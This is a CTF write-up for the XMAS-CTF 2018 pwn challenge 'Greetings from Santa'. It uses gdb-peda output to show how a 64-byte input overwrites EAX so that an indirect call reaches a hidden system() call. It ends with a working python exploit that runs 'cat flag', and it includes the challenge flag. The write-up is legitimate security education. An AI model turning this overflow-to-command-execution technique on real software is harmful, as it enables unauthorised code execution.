# __XMAS-CTF 2018__ 
## _Greetings from Santa_

## Information
**Category:** | **Writeup Author**
--- | ---
Pwn | Huascar Tejeda <<htejeda@f2tc.com>>

**Description:** 

> [chall](chall) 
>
> Author: littlewho

**Flag:**

> X-MAS{6r3371n65_fr0m_5y573m_700}

## Solution

This is an interesting challenge. Here's what I learned from the initial analysis:

![](/images/XMAS-CTF-2018/GreetingsFromSanta/01.png)

- What is this `call 0x8048760` after printf("Greetings from Santa! Wanna talk? ")?

```
gdb-peda$ pdisas 0x8048760
Dump of assembler code from 0x8048760 to 0x8048780::	Dump of assembler code from 0x8048760 to 0x8048780:
   0x08048760:	push   ebp
   0x08048761:	mov    ebp,esp
   0x08048763:	sub    esp,0x10
   0x08048766:	mov    eax,0x8048898            ; humm...
   0x0804876b:	mov    DWORD PTR [ebp-0x4],eax
   0x0804876e:	nop
   0x0804876f:	leave  
   0x08048770:	ret    
   0x08048771:	nop
   0x08048772:	push   ebp                       ; o_O - No references to here
   0x08048773:	mov    ebp,esp
   0x08048775:	sub    esp,0x8
   0x08048778:	sub    esp,0xc
   0x0804877b:	push   DWORD PTR [ebp+0xc]
   0x0804877e:	call   0x8048500 <system@plt>

```

- 0x8048898 looks like a string:

```
gdb-peda$ x/10x 0x8048898
0x8048898:	"r\207\004\b؞\004\b\244\210\004\b7Greeter"

gdb-peda$ x/20x 0x8048898
0x8048898:	0x72	0x87	0x04	0x08	0xd8	0x9e	0x04	0x08
0x80488a0:	0xa4	0x88	0x04	0x08	0x37	0x47	0x72	0x65
0x80488a8:	0x65	0x74	0x65	0x72

0x72 0x87 0x04 0x08 = 0x08048772 :-O
```

- In order to reach the second function 0x8048703 first char must be equal to 0x804886b="y"

![](/images/XMAS-CTF-2018/GreetingsFromSanta/02.png)

- Notice the `call eax` after `fgets(buf, 100, stdin); buf[strlen(buf) - 1] = 0`

#### Properties of the executable:
```
[f2tc@htejeda GreetingsFromSanta]$ checksec chall
[*] '/home/f2tc/xmas-ctf/pwn/GreetingsFromSanta/chall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

[f2tc@htejeda GreetingsFromSanta]$ objdump --syms chall 

chall:     file format elf32-i386

SYMBOL TABLE:
no symbols
```

#### Let's do some tests with everything we've learned so far

- I'll use pattern_create to simplify searching for our offset. _Remember that 'y' must be the first character._

```
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

gdb-peda$ r
Starting program: /home/f2tc/xmas-ctf/pwn/GreetingsFromSanta/./chall 
Greetings from Santa! Wanna talk? yAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

[----------------------------------registers-----------------------------------]
EAX: 0x64414148 ('HAAd')
EBX: 0xf7e7d000 --> 0x1c6da8 
ECX: 0x2ccc 
EDX: 0x1 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffffd3e8 --> 0xffffd458 ("eAA4AAJAAfAA5AAKAAgAA6AAL\n")
ESP: 0xffffd370 --> 0xf7e7dc40 --> 0xfbad208b 
EIP: 0x804874c (mov    eax,DWORD PTR [eax])
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048742:	mov    BYTE PTR [ebp+eax*1-0x6c],0x0
   0x8048747:	mov    eax,DWORD PTR [ebp+0x8]
   0x804874a:	mov    eax,DWORD PTR [eax]
=> 0x804874c:	mov    eax,DWORD PTR [eax]
   0x804874e:	sub    esp,0x8
   0x8048751:	lea    edx,[ebp-0x6c]
   0x8048754:	push   edx
   0x8048755:	push   DWORD PTR [ebp+0x8]
[------------------------------------stack-------------------------------------]
0000| 0xffffd370 --> 0xf7e7dc40 --> 0xfbad208b 
0004| 0xffffd374 --> 0xffffd40c ("yAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0008| 0xffffd378 --> 0x0 
0012| 0xffffd37c ("f2tc")
0016| 0xffffd380 --> 0xf7e70000 --> 0xb44040e 
0020| 0xffffd384 --> 0xffffd40c ("yAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0024| 0xffffd388 --> 0x1ff 
0028| 0xffffd38c --> 0xa ('\n')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0804874c in ?? ()
```

Sice in the second function there is a `call eax`, I will focus on controlling EAX.

```
EAX: 0x64414148 ('HAAd')

gdb-peda$ pattern_offset 0x64414148
1681998152 found at offset: 63
```

This is a stripped binary, so let's disassemble the text segment and set a breakpoint before printf("Greetings from Santa! Wanna talk? ")
```
gdb-peda$ info file
Symbols from "/home/f2tc/xmas-ctf/pwn/GreetingsFromSanta/chall".
Local exec file:
`/home/f2tc/xmas-ctf/pwn/GreetingsFromSanta/chall', file type elf32-i386.
Entry point: 0x8048520
0x08048154 - 0x08048167 is .interp
0x08048168 - 0x08048188 is .note.ABI-tag
0x08048188 - 0x080481ac is .note.gnu.build-id
0x080481ac - 0x080481e0 is .gnu.hash
0x080481e0 - 0x080482c0 is .dynsym
0x080482c0 - 0x0804839a is .dynstr
0x0804839a - 0x080483b6 is .gnu.version
0x080483b8 - 0x080483f8 is .gnu.version_r
0x080483f8 - 0x08048420 is .rel.dyn
0x08048420 - 0x08048460 is .rel.plt
0x08048460 - 0x08048483 is .init
0x08048490 - 0x08048520 is .plt
0x08048520 - 0x08048811 is .text
0x08048814 - 0x08048828 is .fini
0x08048828 - 0x080488ca is .rodata
0x080488cc - 0x08048920 is .eh_frame_hdr
0x08048920 - 0x08048a80 is .eh_frame
0x08049ec8 - 0x08049ecc is .init_array
0x08049ecc - 0x08049ed0 is .fini_array
0x08049ed0 - 0x08049efc is .data.rel.ro
0x08049efc - 0x08049ffc is .dynamic
0x08049ffc - 0x0804a000 is .got
0x0804a000 - 0x0804a02c is .got.plt
0x0804a02c - 0x0804a030 is .data
0x0804a040 - 0x0804a070 is .bss

gdb-peda$ pdisas 0x08048520,0x08048811
...
0x0804869b:	push   0x8048848
0x080486a0:	call   0x80484f0 <printf@plt>
...

gdb-peda$ b *0x0804869b
gdb-peda$ r < <(python -c 'print "y" + "A"*63 +"\n" + "f2tc"')
```

Pay careful attention to what happens after `printf("What is your name? ")` `fgets(buf, 100, stdin);` and `buf[strlen(buf) - 1] = 0`:

```
   0x804874a:	mov    eax,DWORD PTR [eax]
=> 0x804874c:	mov    eax,DWORD PTR [eax]
```

It copies (twice) to eax the contents of memory currently pointed to by eax. `call eax` right after this.

Remember the strange `call 0x8048760` we saw at the beginning? Inside of it it has a string 0x8048898 that will help us defeat this challenge.

- If we overwrite EAX with 0x8048898, after the two dereferences we will have:
`EAX: 0xffffd44c --> 0x8048898 --> 0x8048772 (push   ebp)`
- The string of our second question is pushed and system gets called:

```
=> 0x804877e:	call   0x8048500 <system@plt>
Guessed arguments:
arg[0]: 0xffffd37c ("f2tc")
```

## Exploit

**Buffer** | **EAX** | **CMD**
--- | --- | ---
"y" + "A" * 63 + "\n" | 0x8048898 | cat flag

```bash
[f2tc@htejeda GreetingsFromSanta]$ python -c 'import struct;print "y" + "A"*63 + struct.pack("<I", 0x8048898) + "\n" + "cat flag"' | ./chall
Greetings from Santa! Wanna talk? What is your name? X-MAS{6r3371n65_fr0m_5y573m_700}
```
